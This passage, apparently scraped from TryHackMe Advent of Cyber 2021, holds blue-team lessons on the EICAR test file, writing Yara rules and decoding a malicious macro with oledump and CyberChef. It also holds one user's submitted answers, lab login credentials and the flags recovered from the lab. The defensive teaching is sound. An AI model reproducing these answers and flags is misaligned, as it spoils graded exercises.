ready. If you don't see the machine in your browser, click the \"Show Split View\" button.</p>","taskType":"vm","taskNo":25,"taskCreated":"2021-11-16T13:47:52.432Z","taskDeadline":null,"tasksInfo":[{"question":"Open the terminal and navigate to the file on the desktop named 'testfile'. Using the 'strings' command, check the strings in the file. There is only a single line of output to the 'strings' command. What is the output?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":0,"submission":"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*","noAnswer":false,"answerDesc":"Answer format: **************************}*****************************************"},{"question":"<p>Check the file type of 'testfile' using the 'file' command. What is the file type?<br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":0,"submission":"EICAR virus test files","noAnswer":false,"answerDesc":"Answer format: ***** ***** **** *****"},{"question":"<p>Calculate the file's hash and search for it on VirusTotal. When was the file first seen in the wild?<br /></p>","hint":"Check the Details tab","questionNo":3,"correct":true,"extraPoints":0,"attempts":0,"submission":"2005-10-17 22:03:48","noAnswer":false,"answerDesc":"Answer format: ********** **:**:**"},{"question":"<p>On VirusTotal's detection tab, what is the classification assigned to the file by Microsoft?<br /></p>","hint":"Check the Detections tab and look for Microsoft","questionNo":4,"correct":true,"extraPoints":0,"attempts":2,"submission":"Virus:DOS/EICAR_Test_File","noAnswer":false,"answerDesc":"Answer format: *****:***/***************"},{"question":"<p>Go to <a href=\"https://www.eicar.org/?page_id=3950\" target=\"_blank\">this link</a> to learn more about this file and what it is used for. What were the first two names of this file?<br /></p>","hint":"Mention both names based on its original author with 'or' in-between the names. ","questionNo":5,"correct":true,"extraPoints":0,"attempts":1,"submission":"ducklin.htm or ducklin-html.htm","noAnswer":false,"answerDesc":"Answer format: *******.*** ** ************.***"},{"question":"<p>The file has 68 characters in the start known as the known string. It can be appended with whitespace characters upto a limited number of characters. What is the maximum number of total characters that can be in the file?<br /></p>","hint":"Look under the \"The Anti-Malware Test file' heading","questionNo":6,"correct":true,"extraPoints":0,"attempts":0,"submission":"128","noAnswer":false,"answerDesc":"Answer format: ***"}],"uploadId":"61a5588b3fc2c0004ef0ebd9","questions":[{"questionNo":1,"question":"Open the terminal and navigate to the file on the desktop named 'testfile'. Using the 'strings' command, check the strings in the file. There is only a single line of output to the 'strings' command. What is the output?","hint":""},{"questionNo":2,"question":"<p>Check the file type of 'testfile' using the 'file' command. What is the file type?<br /></p>","hint":""},{"questionNo":3,"question":"<p>Calculate the file's hash and search for it on VirusTotal. When was the file first seen in the wild?<br /></p>","hint":"Check the Details tab"},{"questionNo":4,"question":"<p>On VirusTotal's detection tab, what is the classification assigned to the file by Microsoft?<br /></p>","hint":"Check the Detections tab and look for Microsoft"},{"questionNo":5,"question":"<p>Go to <a href=\"https://www.eicar.org/?page_id=3950\" target=\"_blank\">this link</a> to learn more about this file and what it is used for. What were the first two names of this file?<br /></p>","hint":"Mention both names based on its original author with 'or' in-between the names. "},{"questionNo":6,"question":"<p>The file has 68 characters in the start known as the known string. It can be appended with whitespace characters upto a limited number of characters. What is the maximum number of total characters that can be in the file?<br /></p>","hint":"Look under the \"The Anti-Malware Test file' heading"}]},{"taskTitle":"[Day 21] <span class=\"badge badge-soft-primary size-16\">Blue Teaming</span> Needles In Computer Stacks","taskDesc":"<h3>Story</h3><p>Grinch Enterprises have been very sneaky this year - using multiple attack vectors (both know and unknown) to wreak havoc across the Best Festival Company. It's 4 days from Christmas and there's still so much work to do! McBlue, the only technical person, has suggested using automation and tooling to detect malicious files across the network. Can you work with him to remove any malicious files from the network?</p><h2><span style=\"font-size:24px\">Check out SecurityNinja's walkthrough video for day 21 </span><a href=\"https://youtu.be/L3b6hUkftgg\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a><br /><br /></h2><h3>Learning Objectives:</h3><p>In this task, we will learn:</p><ul><li>What are Yara rules</li><li>What is the basic structure of Yara rules</li><li>How to write basic Yara rules</li><li>How Yara rules are used</li></ul><h3>Yara</h3><p><span style=\"font-weight:bolder\">Introduction:</span></p><p>YARA is a multi-platform tool for matching patterns of interest in (malicious) files. It was created by Victor Alvarez from VirusTotal. It is used to perform research on malware families and identify malware with similar patterns. It can help in categorizing malware in different malware families, and can also be used as a detection aid for malware analysis. </p><p>Yara rules are very widely used in the industry for the above-mentioned purposes. There are various open-source repositories of Yara rules shared by different organizations and people that can be leveraged by the security community in their fight against malware. <a href=\"https://github.com/InQuest/awesome-yara\">This GitHub </a>repository contains links to a lot of such open-source repositories.</p><p><span style=\"font-weight:bolder\">Syntax:</span></p><p>The basic syntax of a Yara rule is as follows:</p><p></p><pre style=\"font-size:14px\"><code>rule rulename<br />  {<br />    meta:<br />      author = \"tryhackme\"<br />      description = \"test rule\"<br />      created = \"11/12/2021 00:00\"<br />    strings:<br />      $textstring = \"text\"<br />      $hexstring = {4D 5A}<br />    conditions:<br />      $textstring and $hexstring<br />  }</code></pre><p></p><p>We can see that the rule starts with the word <code style=\"font-size:14px\">rule</code> followed by the name of the rule. This indicates the start of the rule. We discuss the different sections of the rule below. Among these, the metadata section (uses keyword <code style=\"font-size:14px\">meta</code> ) as discussed at the end, because it is an optional section.</p><p><span style=\"font-weight:bolder\">Strings:</span></p><p>As the name suggests, this section is all about the strings you want to match in a Yara rule. In this section, we define strings as if we will define variables. A string declaration starts with a <code style=\"font-size:14px\">$</code> sign, followed by the name we want to assign to that string. In the above example, we have defined the two strings as <code style=\"font-size:14px\">$textstring</code> and <code style=\"font-size:14px\">$hexstring</code>.</p><p>As the names of the strings signify, strings can be text strings or hex strings. Text strings are strings found in the legible text portion of a file, however, hex strings are raw sequences of bytes in a file. To define text strings, we use double quotes, and to define hex strings, we use curly brackets. An implementation of this can be seen in the example rule above. Text strings can also use regular expressions or regex, for more complex pattern matching.</p><p><span style=\"font-weight:bolder\">Conditions:</span></p><p>The condition section defines the conditions that the rule writer wants to meet in order for the rule to hit on a file. Conditions are boolean expressions, and they use the strings defined in the strings section as variables. For example, in the example above, we use the <code style=\"font-size:14px\">and</code> operator between the two strings. This means that the rule will hit if it identifies a <code style=\"font-size:14px\">4D 5A</code> hex string anywhere in the file as well as the text string <code style=\"font-size:14px\">text</code>. There is no other condition in this rule. The most commonly used operators are <code style=\"font-size:14px\">and</code>, <code style=\"font-size:14px\">or</code> and <code style=\"font-size:14px\">not</code>. The <code style=\"font-size:14px\">and</code> operator returns true when all the conditions are true. The <code style=\"font-size:14px\">or</code> operator returns true when any one of the conditions is true. And the <code style=\"font-size:14px\">not</code> returns true when the given condition is false. In the case of strings, <code style=\"font-size:14px\">and</code>will be true when the file contains all the strings that are part of that condition, <code style=\"font-size:14px\">or</code> will be true when the file contains any of the strings that are part of that condition, and <code style=\"font-size:14px\">not</code> will be true when the string mentioned in the condition is not a part of the file. The following table illustrates when each of these operators will be true:</p><table class=\"table table-bordered\" style=\"width:979px\"><tbody><tr><td><span style=\"font-weight:bolder\">Operator</span></td><td><span style=\"font-weight:bolder\">Condition</span></td></tr><tr><td>and</td><td>All statements are true</td></tr><tr><td>or</td><td>Any one statement is true</td></tr><tr><td>not</td><td>The statement is false</td></tr></tbody></table><p>Conditions can be much more complex than the ones we mentioned above, but for the sake of brevity, we will not go into further details in this task.</p><p><span style=\"font-weight:bolder\">Metadata:</span></p><p>Metadata is an optional, but important section in the rules. It starts with the keyword <code style=\"font-size:14px\">meta</code>. It can be used to add additional information about the rule to help the analyst in their analysis. Generally, it contains arbitrarily defined identifiers, and their values, which are universally understood. For example, in our example rule above, we used the identifiers of <code style=\"font-size:14px\">author</code>, <code style=\"font-size:14px\">description</code>, and <code style=\"font-size:14px\">created</code>. These identifiers are easy to understand in the type of information they are providing. Adding metadata to rules is especially important when contributing to the community, as they provide important contextual information and attribution for the rule.</p><p><span style=\"font-weight:bolder\">Writing your own rules:</span></p><p>With the basic introduction out of the way, we can try writing some of our own rules. So far, we have understood that the rule basically consists of a strings definition section and a conditions section. The strings definition section will define the strings that we want to use in the rule, and the conditions section will define the conditions that will apply to those strings. Lastly, we can add any additional information in the metadata section.</p><p>To start writing a rule, start the machine attached to the task. Once the machine has started, click on the tryhackme logo on the top-left corner. In the search bar, write scite and select the relevant icon to open the SciTE text editor. You can open any other text editor of your choice as well.</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/scite.png\" alt style=\"width:489.5px\" /></p><p>Now using the knowledge gained from this task, let’s start writing the rule. We will write a rule that matches some strings from the EICAR antivirus test file we learned about in the malware analysis task. This file is placed on the Desktop on the machine with the name <code style=\"font-size:14px\">testfile</code>. The following screenshot shows our demo rule for detecting a few strings found in the EICAR test file.</p><p></p><pre style=\"font-size:14px\"><code>rule eicaryara   {<br />    meta:<br />      author=\"tryhackme\"<br />      description=\"eicar string\"<br />    strings:<br />      $a=\"X5O\"<br />      $b=\"EICAR\"<br />      $c=\"ANTIVIRUS\"<br />      $d=\"TEST\"<br />    condition:<br />      $a and $b and $c and $d<br />  }</code></pre><p></p><p>Next, we save this file and give it a name of our choice. We have saved this file on the Desktop for easier access when running the Yara rule on our testfile.</p><p><img src=\"https://assets.tryhackme.com/additional/aoc2021/eicaryara.png\" alt style=\"width:489.5px\" /></p><p><span style=\"font-weight:bolder\">Running the Yara rules:</span></p><p>So now that we have written a rule, let’s learn how to run it.</p><p>The syntax to run a Yara rule can be simply stated as follows:</p><p><code style=\"font-size:14px\">yara [options] rule_file [target]</code></p><p>In our example above, our <code style=\"font-size:14px\">rule_file</code> will be the file we saved as eicaryara, and the <code style=\"font-size:14px\">target</code> will be our testfile. Therefore, our command for running the rule will look like this:</p><p><code style=\"font-size:14px\">yara [options] eicaryara testfile</code></p><p>Giving the <code style=\"font-size:14px\">options</code> here is optional. If we run this command as it is, it will return us with the rule name and the file name if the rule is hit. If the rule is not hit, it will not return anything.</p><p>When the rule is a hit the output will look like this:</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">user@TryHackMe$ yara eicaryara testfile\neicaryara testfile\nuser@TryHackMe$</code>\n        </pre></div></div><p>When the rule is a miss, the output will look like this:</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">user@TryHackMe$ yara eicaryara testfile\nuser@TryHackMe$</code>\n        </pre></div></div><p>We can use the -m option for Yara to return the metadata when the rule is hit. The output, in that case, will look like this:</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">user@TryHackMe$ yara -m eicaryara testfile\neicaryara [author=\"tryhackme\",description=\"eicar string\"] testfile\nuser@TryHackMe$</code>\n        </pre></div></div><p>Similarly, we can use the -s option to print the strings that matched the file. The output in that scenario will be as follows:</p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Terminal</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">user@TryHackMe$ yara -s eicaryara testfile\neicaryara testfile\n0x1c:$b: EICAR\n0x2b:$c: ANTIVIRUS\n0x35:$d: TEST\nuser@TryHackMe$</code>\n        </pre></div></div><p>The output here shows the rule that matched, the strings that matched, their identifiers, and their location in the file. Notice that the screenshot contains 3 of the 4 strings we wrote in the rule. This is because we modified the rule before running this command such that one of the strings doesn’t appear in the file. Hence we only see the strings that appear in the test file, and we don’t see the ones which did not match.</p><p><span style=\"font-weight:bolder;font-size:24px\">Additional resources:</span><br /></p><p>For the sake of brevity, we just touched upon the basics of Yara rules in this task. Yara rules are capable of doing a lot of more complex pattern matching than what we touched here. If you are interested in learning more about Yara rules, you can check the <a href=\"https://tryhackme.com/jr/yara\">Yara room on TryHackMe</a>. You can also check out the <a href=\"https://yara.readthedocs.io/en/stable/writingrules.html#\">Yara documentation</a> or take a look at several <a href=\"https://github.com/Yara-Rules/rules\">community written rules</a> to get an idea of what type of Yara rules are written by the community.</p><p>For now, let’s see if we can answer the following questions to evaluate what we have learned so far.</p><p>Deploy the machine attached to the task. It will be visible in the split-screen view when ready. If you don't see the machine in your browser, click the \"Show Split View\" button.</p>","taskType":"vm","taskNo":26,"taskCreated":"2021-11-16T13:47:53.195Z","taskDeadline":null,"tasksInfo":[{"question":"We changed the text in the string $a as shown in the <i>eicaryara</i> rule we wrote, from X5O to X50, that is, we replaced the letter O with the number 0. The condition for the Yara rule is <i><span style=\"font-weight:bolder\">$a and $b and $c and $d</span></i>. If we are to only make a change to the first boolean operator in this condition, what boolean operator shall we replace the 'and' with, in order for the rule to still hit the file?","hint":"","questionNo":1,"correct":true,"extraPoints":0,"attempts":1,"submission":"or","noAnswer":false,"answerDesc":"Answer format: **"},{"question":"<p>What option is used in the Yara command in order to list down the metadata of the rules that are a hit to a file? <br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":1,"submission":"-m","noAnswer":false,"answerDesc":"Answer format: **"},{"question":"<p>What section contains information about the author of the Yara rule?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":1,"submission":"metadata","noAnswer":false,"answerDesc":"Answer format: ********"},{"question":"<p>What option is used to print only rules that did not hit?<br /></p>","hint":"Check the Yara documentation link from the Further reading section to find the answer to this","questionNo":4,"correct":true,"extraPoints":0,"attempts":1,"submission":"-n","noAnswer":false,"answerDesc":"Answer format: **"},{"question":"<p>Change the Yara rule value for the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$a</span> string to <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">X50</span>. Rerun the command, but this time with the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">-c</span> option. What is the result?<br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":1,"submission":"0","noAnswer":false,"answerDesc":"Answer format: *"}],"uploadId":"618d43d83a1b7f061ac0bbff","questions":[{"questionNo":1,"question":"We changed the text in the string $a as shown in the <i>eicaryara</i> rule we wrote, from X5O to X50, that is, we replaced the letter O with the number 0. The condition for the Yara rule is <i><span style=\"font-weight:bolder\">$a and $b and $c and $d</span></i>. If we are to only make a change to the first boolean operator in this condition, what boolean operator shall we replace the 'and' with, in order for the rule to still hit the file?","hint":""},{"questionNo":2,"question":"<p>What option is used in the Yara command in order to list down the metadata of the rules that are a hit to a file? <br /></p>","hint":""},{"questionNo":3,"question":"<p>What section contains information about the author of the Yara rule?<br /></p>","hint":""},{"questionNo":4,"question":"<p>What option is used to print only rules that did not hit?<br /></p>","hint":"Check the Yara documentation link from the Further reading section to find the answer to this"},{"questionNo":5,"question":"<p>Change the Yara rule value for the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">$a</span> string to <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">X50</span>. Rerun the command, but this time with the <span class=\"notion-enable-hover\" style=\"font-family:SFMono-Regular, Menlo, Consolas, &quot;PT Mono&quot;, &quot;Liberation Mono&quot;, Courier, monospace;line-height:normal;background:rgba(135, 131, 120, 0.15);color:rgb(235, 87, 87);border-radius:3px;font-size:13.6px;padding:0.2em 0.4em\">-c</span> option. What is the result?<br /></p>","hint":""}]},{"taskTitle":"[Day 22] <span class=\"badge badge-soft-primary size-16\">Blue Teaming</span> How It Happened","taskDesc":"<p style=\"text-align:center\"><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/60c7fac321aca20049602d2b/room-content/73d974480d8199221e234ebe8f49c667.png\" style=\"width:318.649px;height:353.008px\" />﻿﻿</p><p style=\"text-align:center\"><span style=\"font-size:18px\"><span style=\"font-weight:bolder\">Let it snow ... </span></span></p><p style=\"text-align:center\"><i><span style=\"text-align:left;font-size:1rem\">McSkidy has finally gotten around to identifying the first trace of Grinch Enterprises within their network. They're looking at local machines to determine what exactly they did when they first entered the network. Can you help them make sense of what happened?</span><br /></i></p><h2><span style=\"font-size:24px\">Check out SecurityNinja's walkthrough video for day 22 </span><a href=\"https://www.youtube.com/watch?v=aknI191GcdA\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><p><br />You have probably heard of The Cyber Swiss Army Knife - <span style=\"font-weight:bolder\">CyberChef</span>. This tool will help you uncover what Grinch Enterprises did when they first entered the network.</p><p>All you need is to be a good chef and follow the recipes! </p><p><span style=\"font-size:1rem\">On the left-hand column, you can choose the ingredients or Operations you want to bake the best cake for this Christmas party, as shown in the image below:</span></p><p><span style=\"font-size:1rem\"><br /></span><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/60c7fac321aca20049602d2b/room-content/dca5860f20dab57f1602a9eb85eb7836.png\" style=\"font-size:1rem\" /><br /></p><p><span style=\"font-size:1rem\">To bake the perfect tasty cake, you need to add the ingredients you need in the right order by dragging them to the middle column that says <span style=\"font-weight:bolder\">Recipe</span>.</span><span style=\"font-weight:bolder\"> </span>Pretty cool, right? </p><p>For example, let's decode a base64-encoded string <code style=\"font-size:14px\">R3JpbmNoIEVudGVycHJpc2VzIHdvbid0IHRha2Ugb3ZlciB0aGUgTm9ydGggUG9sZSE=</code>:<br /></p><p><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/60c7fac321aca20049602d2b/room-content/2f1d51b7a0b7890b4357370505e5da39.png\" style=\"width:1046.88px;height:691.263px\" /><br /></p><p><span style=\"font-size:1rem\">According to </span><a href=\"https://developer.mozilla.org/en-US/docs/Glossary/Base64\" target=\"_blank\">Mozilla</a><span style=\"font-size:1rem\">, </span><i>\"Base64 encoding schemes are commonly used when there is a need to encode binary data that needs to be stored and transferred over media that are designed to deal with ASCII.\"  </i><span style=\"font-size:1rem\">While attackers still use this simple form of obfuscation to evade Antivirus detection, it's far from the most effective and stealthy technique.</span></p><p>To decode the string above, we'll use the From Base64 ingredient under the Operations column by dragging it under the Recipe pane (or double click From Base64), then paste our base64-encoded string <code style=\"font-size:14px\">R3JpbmNoIEVudGVycHJpc2VzIHdvbid0IHRha2Ugb3ZlciB0aGUgTm9ydGggUG9sZSE=</code> in the Input text area, and finally BAKE it! <span style=\"font-size:1rem\">You will see the results of the deobfuscated string </span><code style=\"font-size:14px\">Grinch Enterprises won't take over the North Pole!</code><span style=\"font-size:1rem\"> </span><span style=\"font-size:1rem\">in the </span><span style=\"font-size:1rem;font-weight:bolder\">Output </span><span style=\"font-size:1rem\">field. </span></p><p>You can drag as many ingredients as you wish to the Recipe field to produce the output that makes sense to you :)</p><p>CyberChef has a lot of interesting features such as being able to decrypt a file or text that was encrypted using various ciphers, as shown below:</p><p><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/60c7fac321aca20049602d2b/room-content/1fffe322bef65f6753fe5881a98b40c0.png\" style=\"font-size:1rem\" /><br /></p><p>Another noteworthy cipher that attackers commonly use, and what we'll focus on, is the XOR (Exclusive Or (XOR)) cipher.</p><p>Exclusive or XOR is a logical operator which results true (1) when two values are different (one is true and the other one is false) and returns 0 when two values are the same, as shown in the image below:</p><p><img src=\"https://tryhackme-images.s3.amazonaws.com/user-uploads/60c7fac321aca20049602d2b/room-content/9e4865ad25555dde30666f7130d60d3c.PNG\" style=\"font-size:1rem\" /><br /></p><p style=\"text-align:center\"><span style=\"font-weight:bolder\">Now that we've taken a look at the basics of CyberChef and some common obfuscation techniques let's explore another helpful tool to complete this task.</span></p><p><span style=\"font-weight:bolder\">Oledump</span> (<a href=\"https://blog.didierstevens.com/programs/oledump-py/\" class=\"notion-link-token notion-enable-hover\" target=\"_blank\"><span class=\"link-annotation-unknown-block-id--1347554771\" style=\"border-bottom:0.05em solid rgba(55, 53, 47, 0.4);border-top-color:rgba(55, 53, 47, 0.4);border-right-color:rgba(55, 53, 47, 0.4);border-left-color:rgba(55, 53, 47, 0.4);opacity:0.7\">oledump.py</span></a>) is an excellent tool written in Python by Didier Stevens, which helps you analyze OLE (Compound File Binary Format) files. You can think of OLE files as 'a mini file system' or similar to a Zip archive. Applications such as MS Office with extensions<span class=\"notion-enable-hover\" style=\"font-style:italic\"> .doc, .xls, .ppt </span>are known as OLE files. Malicious actors can abuse macros to hide malicious commands/scripts within Excel and Word documents.</p><p><span style=\"font-size:1rem\">You can run the command </span><code style=\"font-size:14px\">oledump.py [Filename]</code><span style=\"font-size:1rem\"> to view the streams as shown below:</span></p><div class=\"terminal-container\"><div class=\"terminal-content\"><div class=\"terminal-top\">Command Prompt</div><pre class=\"terminal-code\" style=\"font-size:14px\">           <code class=\"language-shell-session\">C:\\Desktop\\Tools&gt;oledump.py Document1.doc\n1: 114 '\\x01CompObj'\n2: 4096 '\\x05DocumentSummaryInformation'\n3: 4096 '\\x05SummaryInformation'\n4: 13859 '1Table'\n5: 33430 'Data'\n6: 365 'Macros/PROJECT'\n7: 41 'Macros/PROJECTwm'\n8: M 9852 'Macros/VBA/ThisDocument'\n9: 5460 'Macros/VBA/_VBA_PROJECT'\n10: 513 'Macros/VBA/dir'</code>\n        </pre><p>According to the documentation on <a href=\"https://olefile.readthedocs.io/en/latest/OLE_Overview.html\" target=\"_blank\">OLE files</a>, OLE files could contain <span style=\"font-weight:bolder\">storages</span> which are basically folders that contain <span style=\"font-weight:bolder\">streams</span> of data or other <span style=\"font-weight:bolder\">storages</span>. The example below depicts what a typical Word document looks like 'under the hood' and the streams of data you'll normally see. Each stream has a name and <code style=\"font-size:14px\">oledump</code> will conveniently index each stream by assigning it a number to easily select it for analysis.</p><div class=\"figure\" style=\"margin-bottom:24px;color:rgb(64, 64, 64);font-family:Lato, proxima-nova, &quot;Helvetica Neue&quot;, Arial, sans-serif;background-color:rgb(252, 252, 252)\"><img alt src=\"https://olefile.readthedocs.io/en/latest/_images/OLE_VBA_sample.png\" style=\"border:0px;max-width:100%;height:313.508px;width:274.301px\" /></div><p>The <span style=\"font-weight:bolder\">M </span>letter next to a stream indicates that the stream contains a<span style=\"font-weight:bolder\"> VBA Macro</span>. VBA Macros are created using the Visual Basic for Applications programming language and have legitimate use cases. For instance, macros allow users to create custom functions to automate repetitive or time-consuming tasks within Excel or Word.</p><p>Before we start using oledump.py, let's take a look at some of the useful options for analyzing OLE files. To explore more options, use the <code style=\"font-size:14px\">-m</code> option.</p><p><span style=\"font-weight:bolder\">-A</span> does an ASCII dump similar to option -a, but duplicate <span style=\"font-size:1rem\">lines are removed.</span></p><p><span style=\"font-weight:bolder\">-S</span> dumps strings.</p><p><span style=\"font-size:1rem\"><span style=\"font-weight:bolder\">-d</span> produces a raw dump of the stream content. </span></p><p><span style=\"font-weight:bolder\">-s</span> <i>STREAM NUMBER</i> or <span style=\"font-weight:bolder\">--select</span>=<i>STREAM NUMBER</i> <span style=\"font-size:1rem\">allows you to select the stream number to analyze (<span style=\"font-weight:bolder\">-s a</span> to select all streams)</span></p><p><span style=\"font-weight:bolder\">-d</span>, <span style=\"font-weight:bolder\">--dump </span>- perform a raw dump</p><p><span style=\"font-weight:bolder\">-x, --hexdump</span> - perform a hex dump</p><p><span style=\"font-weight:bolder\">-a, --asciidump </span>- perform an ascii dump</p><p><span style=\"font-weight:bolder;font-size:1rem\">-S, --strings</span><span style=\"font-size:1rem\"> - perform a strings dump</span><br /></p><p></p><p><span style=\"font-weight:bolder\">-v, --vbadecompress</span> - VBA decompression</p><div>Grinch Enterprises left a malicious document on the machine, and you need to find it. The document contains a malicious obfuscated base64-encoded script that also comes with a \"secret\" cipher ingredient... <span style=\"font-weight:bolder\">decimal 35. </span>Find out what the evil script does and locate the two flags.</div><div><div><br /></div><div>To solve this challenge, you need to find the stream that contains the obfuscated script. Select the macro stream number 8 and dump the contents by running the command:</div><div><code style=\"font-size:14px\">oledump.py -s 8 -d</code></div><div><br /></div><div>The decimal number 35 will be our <span style=\"font-weight:bolder\">XOR </span>key. Let's build the recipe in CyberChef using the following ingredients:</div><div><br /></div><div>1. <span style=\"font-weight:bolder\">From Base64</span></div><div>2. <span style=\"font-weight:bolder\">XOR</span> 35 (Don't forget to choose Decimal from the dropdown!)</div><div><br /></div><div>You might have noticed the secret script still looks odd because it's double-encoded using Base64! Let's choose <span style=\"font-weight:bolder\">From Base64</span> for our third ingredient. </div></div><div><br /></div><div>Now that you're armed with knowledge let's start the challenge!<br /></div><hr style=\"border:1px solid var(--main-color)\" /><div><p>The virtual machine will launch in-browser. If you wish to access the virtual machine via Remote Desktop, use the credentials below. </p><p><span style=\"font-weight:bolder\">Machine IP</span>: <code style=\"font-size:14px\">MACHINE_IP</code></p><p><span style=\"font-weight:bolder\">User</span>: <code style=\"font-size:14px\">administrator</code></p><p><span style=\"font-weight:bolder\">Password</span>: <code style=\"font-size:14px\">sn0wF!akes!!!</code></p><p><img src=\"https://assets.tryhackme.com/additional/win-event-logs/remmina.png\" style=\"max-width:100%;width:604px;height:auto\" /></p><p>Accept the Certificate when prompted, and you should be logged into the remote system now.</p><p><span style=\"font-weight:bolder\">Note</span>: The virtual machine may take up to 3 minutes to fully load.</p></div></div></div>","taskType":"vm","taskNo":27,"taskCreated":"2021-11-16T13:48:48.607Z","taskDeadline":null,"tasksInfo":[{"question":"What is the username (email address of Grinch Enterprises) from the decoded script?","hint":"oledump.py and CyberChef are your best friends! ","questionNo":1,"correct":true,"extraPoints":0,"attempts":1,"submission":"Grinch.Enterprises.2021@gmail.com","noAnswer":false,"answerDesc":"Answer format: ******.***********.**********.***"},{"question":"<p>What is the mailbox <span style=\"font-size:1rem\">password you found</span><span style=\"font-size:1rem\">?</span><br /></p>","hint":"","questionNo":2,"correct":true,"extraPoints":0,"attempts":1,"submission":"S@ntai$comingt0t0wn","noAnswer":false,"answerDesc":"Answer format: *******************"},{"question":"<p>What is the subject of the email?<br /></p>","hint":"","questionNo":3,"correct":true,"extraPoints":0,"attempts":2,"submission":"Christmas Wishlist","noAnswer":false,"answerDesc":"Answer format: ********* ********"},{"question":"<p>What port is the script using to exfiltrate data from the North Pole?<br /></p>","hint":"","questionNo":4,"correct":true,"extraPoints":0,"attempts":1,"submission":"587","noAnswer":false,"answerDesc":"Answer format: ***"},{"question":"<p>What is the flag hidden found in the document that Grinch Enterprises left behind? (Hint: use the following command oledump.py -s {stream number} -d, the answer will be in the caption).<br /></p>","hint":"","questionNo":5,"correct":true,"extraPoints":0,"attempts":1,"submission":"YouFoundGrinchCookie","noAnswer":false,"answerDesc":"Answer format: ********************"},{"question":"<p>There is still a second flag somewhere... can you find it on the machine?<br /></p>","hint":"The clue is in the deobfuscated PowerShell script. ","questionNo":6,"correct":true,"extraPoints":0,"attempts":4,"submission":"S@nt@c1Au$IsrEAl","noAnswer":false,"answerDesc":"Answer format: ****************"}],"uploadId":"61a6d0d8f87bcb00419dbee6","questions":[{"questionNo":1,"question":"What is the username (email address of Grinch Enterprises) from the decoded script?","hint":"oledump.py and CyberChef are your best friends! "},{"questionNo":2,"question":"<p>What is the mailbox <span style=\"font-size:1rem\">password you found</span><span style=\"font-size:1rem\">?</span><br /></p>","hint":""},{"questionNo":3,"question":"<p>What is the subject of the email?<br /></p>","hint":""},{"questionNo":4,"question":"<p>What port is the script using to exfiltrate data from the North Pole?<br /></p>","hint":""},{"questionNo":5,"question":"<p>What is the flag hidden found in the document that Grinch Enterprises left behind? (Hint: use the following command oledump.py -s {stream number} -d, the answer will be in the caption).<br /></p>","hint":""},{"questionNo":6,"question":"<p>There is still a second flag somewhere... can you find it on the machine?<br /></p>","hint":"The clue is in the deobfuscated PowerShell script. "}]},{"taskTitle":"[Day 23] <span class=\"badge badge-soft-primary size-16\">Blue Teaming</span> PowershELlF Magic","taskDesc":"<p><span style=\"font-size:1rem\">Deploy the virtual machine attached to this task; it will be visible in the split-screen view once it is ready. </span><br /></p><p>If you don't see a virtual machine load, then click the <span style=\"font-weight:bolder\">Show Split View</span> button. </p><p><img src=\"https://assets.tryhackme.com/additional/samaoc3/split-view.png\" style=\"width:451px\" /></p><h2><span style=\"font-size:24px\">Check out SecurityNinja's walkthrough video for day 23 </span><a href=\"https://www.youtube.com/watch?v=xx4K57lnaTI\" target=\"_blank\"><span style=\"font-size:24px\">here</span></a></h2><hr style=\"border:1px solid var(--main-color)\" /><p>One of the administrators with access to the Elf Dome Defense system realized that his password file was missing from his desktop. Without the password, he will not be able to log into the Mission Control panel. McSkidy suspects that perhaps one of the previous phishing attempts was successful. McSkidy jumps into action.</p><p>You need to inspect the event logs to determine what has occurred and see if you can retrieve the password from the deleted text file. </p><p>Learning Objectives:</p><ul><li>Analyze Windows event logs to understand actions performed in an attack.</li><li>Recover key artifacts in unencrypted web communications. </li><li>Utilize PowerShell 